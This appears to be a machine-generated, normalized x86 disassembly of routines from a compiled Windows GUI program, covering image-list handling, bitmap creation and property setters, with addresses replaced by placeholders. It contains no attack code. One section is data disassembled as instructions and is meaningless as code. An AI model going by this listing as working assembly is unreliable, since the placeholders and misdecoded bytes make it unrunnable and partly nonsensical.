pop [ fs : 0x0 ]
add esp 0xc
sub_44c63c
push ebx
push esi
push edi
call sub_4035d8
mov ebx edx
mov edi eax
mov eax [ edi + 0x34 ]
call sub_40324c
jmp r-xdata
mov esi [ edi + 0x30 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_41a320
call sub_40324c
mov eax [ edi + 0x30 ]
call sub_40324c
mov edx ebx
and dl 0xfc
mov eax edi
call sub_41fc24
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4035c0
sub_44c68a
mov eax eax
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_44c6d4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_41a294
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033fc
mov edx edi
call sub_44c458
sub_44c720
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x38 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x34 ]
call sub_44dfc4
pop esi
pop ebx
retn
mov edx [ ebx + 0x34 ]
call sub_44e008
mov edx ebx
mov eax [ ebx + 0x38 ]
call sub_41fca8
sub_44c760
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_41fef4
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x38 ]
jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax esi
call sub_44c7c8
sub_44c7a8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_41a0dc
mov [ esi + 0x5c ] ebx
mov edx ebx
mov eax esi
call sub_41fca8
pop esi
pop ebx
retn
sub_44c7c8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_41a37c
test eax eax
jl r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x5c ] eax
sub_44c7e4
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
test [ ebx + 0x1c ] 0x10
je r-xdata
inc esi
xor edi edi
pop edi
pop esi
pop ebx
retn
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
dec esi
jne r-xdata
cmp [ esi + 0x250 ] 0x0
je r-xdata
mov eax [ esi + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_44c84c
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esi + 0x8 ]
call sub_457120
mov ebx eax
mov ax [ esi + 0x4 ]
mov edx ebx
call sub_44f860
mov ebp eax
test bp bp
je r-xdata
xor eax eax
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp bp [ ebx + 0x84 ]
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax + edi * 4 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
jmp r-xdata
cmp [ ebx + 0x90 ] 0x0
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_44d0f4
mov edx ebp
call sub_44d154
inc eax
je r-xdata
sub_44c8d8
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x4a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_44c8f8
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x52 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_44c918
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x58 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x1 ] al
mov al [ esp ]
mov [ ebx + 0x58 ] al
cmp al 0x1
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
inc esi
xor ebp ebp
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
test edi edi
je r-xdata
dec al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
cmp [ esp + 0x1 ] 0x2
jne r-xdata
test edi edi
je r-xdata
jmp r-xdata
inc ebp
dec esi
jne r-xdata
mov dl [ edi + 0x94 ]
mov eax edi
call sub_44cd68
cmp [ esp ] 0x2
jne r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov edi [ eax + ebp * 4 ]
mov al [ esp ]
sub al 0x1
jb r-xdata
mov al [ edi + 0x6a ]
mov [ edi + 0x94 ] al
mov dl 0x1
mov eax edi
call sub_44cd68
sub_44cab0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4204e0
mov [ esi + 0x6a ] 0x1
mov [ esi + 0x80 ] 0xffffffff
mov [ esi + 0x86 ] 0x1
xor eax eax
mov [ esi + 0x90 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax esi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_44cb04
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
mov eax [ esi + 0x98 ]
call sub_40324c
mov eax [ esi + 0x9c ]
call sub_40324c
cmp [ esi + 0x90 ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44c3b4
test bl bl
jle r-xdata
lea eax [ esi + 0x90 ]
call sub_40d420
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_44cb54
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41a8c0
mov edx [ ebx + 0x64 ]
mov edi esi
mov eax edi
call sub_44cc00
mov dl [ ebx + 0x69 ]
mov eax edi
call sub_44cc60
mov dl [ ebx + 0x6a ]
mov eax edi
call sub_44cd68
mov edx [ ebx + 0x74 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x7c ]
mov eax edi
call sub_44cea0
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_44cf00
mov dx [ ebx + 0x84 ]
mov eax edi
call sub_44cf5c
mov dl [ ebx + 0x86 ]
mov eax edi
call sub_44cfc0
push [ ebx + 0x44 ]
push [ ebx + 0x40 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax [ ebx + 0x48 ]
mov [ edi + 0x48 ] eax
mov eax [ ebx + 0x4c ]
mov [ edi + 0x4c ] eax
mov eax [ ebx + 0x38 ]
mov [ edi + 0x38 ] eax
mov eax [ ebx + 0x3c ]
mov [ edi + 0x3c ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44cc00
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x64 ]
call sub_4043a8
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x64 ]
mov edx [ esp ]
call sub_403ff0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4033fc
test eax eax
je r-xdata
sub_44cc60
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x68 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x1
xor edx edx
push ebp
push sub_44cd58
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x69 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x69 ] bl
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jle r-xdata
inc edi
xor esi esi
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x69 ] 0x0
je r-xdata
inc esi
dec edi
jne r-xdata
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
call sub_44c718
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_4033fc
test eax eax
je r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov edx esi
call sub_44c704
mov ebx eax
cmp ebx [ ebp - 0x4 ]
je r-xdata
mov eax [ ebx + 0x6c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x6c ]
jne r-xdata
xor edx edx
mov eax ebx
call sub_44cc60
sub_44cd68
push ebx
push esi
push edi
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x6a ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov dl [ eax + 0x58 ]
cmp dl 0x1
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
cmp dl 0x2
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
jmp r-xdata
inc edi
dec esi
jne r-xdata
mov dl [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov [ esp ] 0x1
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4033fc
test eax eax
je r-xdata
sub_44cde0
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax ebp
mov edx [ ebx + 0x78 ]
call sub_4043a8
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
lea eax [ ebx + 0x78 ]
mov edx ebp
call sub_403ff0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_41a238
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_41a238
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
sub_44ce48
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x74 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x74 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4033fc
test eax eax
je r-xdata
sub_44cea0
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x7c ]
call sub_4043a8
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x7c ]
mov edx [ esp ]
call sub_403ff0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4033fc
test eax eax
je r-xdata
sub_44cf00
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x80 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x80 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4033fc
test eax eax
je r-xdata
sub_44cf5c
push ebx
push esi
push edi
push ecx
mov [ esp ] dx
mov ebx eax
mov ax [ esp ]
cmp ax [ ebx + 0x84 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov ax [ esp ]
mov [ ebx + 0x84 ] ax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov dx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4033fc
test eax eax
je r-xdata
sub_44cfc0
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x86 ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebp + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebp + 0x86 ] bl
mov eax ebp
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x50 ]
call sub_41a238
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov eax [ ebp + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_4033fc
test eax eax
je r-xdata
sub_44d020
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x64 ]
call sub_4043a8
jne r-xdata
xor eax eax
jmp r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov ebx eax
mov edx edi
mov eax esi
call sub_420130
test bl bl
je r-xdata
mov al 0x1
test [ ebx + 0x1c ] 0x1
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_44cc00
sub_44d06c
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x8a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_44d094
push ebx
mov ebx eax
xor eax eax
mov edx [ ebx + 0x5c ]
test edx edx
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x44 ]
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ edx + 0x58 ] 0x0
jne r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x95 ] 0x0
je r-xdata
pop ebx
retn
xor eax eax
jmp r-xdata
mov eax ebx
call sub_44c520
test al al
jne r-xdata
cmp [ ebx + 0x69 ] 0x0
je r-xdata
mov al 0x1
mov dl [ ebx + 0x69 ]
xor dl 0x1
mov eax ebx
call sub_44cc60
cmp [ ebx + 0x69 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
sub_44d128
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41b880
mov edi eax
mov eax esi
call sub_44fb4c
movzx ecx ax
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_44d154
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0xffffffff
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov [ esp ] ebx
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp bp ax
jne r-xdata
sub_44d198
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44d1bd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d1c4
retn
sub_44d1f8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
rol [ eax + eax + 0x48 ] cl
rol [ eax + eax + 0x10 ] cl
add [ eax ] al
add [ eax ] dh
adc [ eax ] eax
xchg esp eax
xor al 0x40
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ eax + ebp * 8 + 0x44 ] dl
add [ ecx ] al
add bh bh
dec [ eax + 0xb0044e8 ]
push esp
inc ebx
push 0x65676e61
dec esp
imul ebp [ esi + 0x6b ] r-xdata
add [ ebx ] ecx
push esp
dec ecx
insd
popad
dec ecx
outsb
js r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
mov eax eax
mov esp 0x44d2
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
rol [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax + eax + 0x8 ] cl
rol [ eax + eax + 0x68 ] cl
add [ eax ] al
add [ ebx + ecx * 4 ] al
inc ecx
add [ eax + 0x3 ] cl
inc edx
add [ eax - 0x63ffbfcc ] ah
cld
inc ecx
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add ah dl
rol [ eax + eax + 0x24 ] cl
fiadd [ eax + eax - 0x54 ]
loope r-xdata
add [ eax ] dl
push esp
inc ebx
jne r-xdata
add [ ebp + ebx * 8 + 0x44 ] ah
add [ eax ] ch
add [ edx ] al
hlt
mov eax 0x20000000
retn
je r-xdata
pop ds
retn
insd
dec ecx
insd
popad
dec esp
imul esi [ ebx + 0x74 ] 0x2000408d
rol [ eax + eax + 0x7 ] cl
adc [ ebx + eax * 2 + 0x75 ] dl
jae r-xdata
ror [ ebx + 0x2835e8c6 ] cl
std
inc edi
inc esi
xor al 0x10
add [ eax ] al
add bh al
inc esi
xor [ eax ] dl
add [ eax ] al
add [ ebx - 0xef743a ] cl
push edx
xor al 0x8b
mov [ ebx + ebx * 8 + 0x5e80f74 ] 0x62
sti
jmp [ edi + ecx * 4 + 0x5 ]
outsd
insd
dec ecx
insd
popad
dec esp
imul esi [ ebx + 0x74 ] r-xdata
add [ ecx + eax * 2 + 0x7000200 ] cl
dec ecx
insd
dec esp
imul esi [ ebx + 0x74 ] 0xc08b0000
sub_44d388
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41fbd8
mov [ esi + 0x34 ] 0x10
mov [ esi + 0x30 ] 0x10
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax esi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_44d3d4
push ebx
push esi
push edi
call sub_4035d8
mov ebx edx
mov edi eax
jmp r-xdata
mov esi [ edi + 0x4c ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_41a320
mov edx eax
mov eax edi
call sub_44dfc4
mov eax [ edi + 0x50 ]
call sub_40324c
mov eax edi
call sub_44d698
mov eax [ edi + 0x4c ]
call sub_40324c
xor eax eax
mov [ edi + 0x4c ] eax
mov eax [ edi + 0x54 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_41fc24
test bl bl
jle r-xdata
call sub_40324c
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4035c0
sub_44d43e
mov eax eax
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_44d4ed
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ ebx + 0x4c ] eax
mov eax [ ebx + 0x30 ]
cmp eax 0x1
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b938
call sub_4039d8
cmp eax 0x8000
jg r-xdata
cmp [ ebx + 0x34 ] 0x1
jge r-xdata
mov [ ebx + 0x38 ] 0x4
mov [ ebx + 0x41 ] 0x1
mov dl 0x2
mov eax ebx
call sub_44df4c
mov [ ebx + 0x43 ] 0x0
mov [ ebx + 0x44 ] 0x1fffffff
mov [ ebx + 0x48 ] 0x1fffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_42818c
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_44d50c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d4f4
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
sub_44d50c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] eax
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44d5ad
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleBitmap
mov edx eax
mov eax ebx
call sub_429274
mov eax ebx
call sub_428754
mov eax [ eax + 0x14 ]
xor edx edx
call sub_423720
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_418e04
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_428754
pop edx
call sub_423ac4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d5b4
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_44d5d0
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax [ ebx + 0x34 ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
push esp
lea eax [ esp + 0x8 ]
push eax
push edx
call ImageList_GetIconSize
mov eax [ esp + 0x4 ]
mov [ ebx + 0x34 ] eax
mov eax [ esp ]
mov [ ebx + 0x30 ] eax
mov eax ebx
call sub_44d50c
pop ecx
pop edx
pop ebx
retn
sub_44d608
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44d698
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_44d5d0
mov [ ebx + 0x3c ] esi
mov eax ebx
mov si 0xffef
call sub_403448
sub_44d644
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_44ded4
test ebx ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov eax ebx
call sub_4287c0
cmp al 0x1
jne r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44d698
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_44d4f8
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x3c ] eax
mov eax ebx
mov si 0xffef
call sub_403448
pop esi
pop ebx
retn
cmp [ ebx + 0x42 ] 0x0
jne r-xdata
mov eax ebx
call sub_44d634
push eax
call ImageList_Destroy
sub_44d6d0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_44d763
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x38 ]
push esi
push esi
xor eax eax
mov al [ ebx + 0x41 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xfe
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
call ImageList_Create
mov [ ebx + 0x3c ] eax
mov eax ebx
call sub_44d4f8
test al al
jne r-xdata
mov eax [ ebx + 0x44 ]
cmp eax 0x1fffffff
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b938
call sub_4039d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d76a
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
mov edx eax
mov eax ebx
call sub_44d8f8
sub_44d770
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42818c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44d81f
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_42818c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44d802
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44d500
mov ecx [ ebp - 0x10 ]
mov edx esi
